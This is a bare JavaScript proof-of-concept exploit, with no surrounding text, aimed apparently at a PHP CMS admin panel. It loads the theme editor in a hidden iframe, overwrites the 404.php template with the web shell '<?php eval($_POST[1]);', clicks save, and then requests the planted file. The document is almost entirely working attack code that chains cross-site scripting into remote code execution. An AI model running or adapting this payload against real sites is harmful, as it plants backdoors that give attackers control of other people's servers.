function step1(){
    var data2="<iframe id=\"testxss\" src=\"http://localhost/admin/theme-editor.php?theme=default&file=404.php\" width=\"0%\" height=\"0%\" onload=\"poc()\"></iframe>";
    var oldata=document.body.innerHTML;
    document.body.innerHTML=(oldata+data2);}
var times=0;
var g_shell=0;
function poc(){
    if(times<=10){
        var htmldata=document.getElementById('testxss').contentWindow.document.getElementById('content');
        var btn=document.getElementById('testxss').contentWindow.document.getElementsByTagName('button');
        htmldata.innerText=('<?php eval($_POST[1]);');
        btn[1].click();
        times+=1;
        if(g_shell==1){
            var xhr1=new XMLHttpRequest();
            xhr1.open('get','/usr/themes/default/404.php?shell=1');
            xhr1.send();
            }
        else{
            return 0;
        }
    }
}
step1();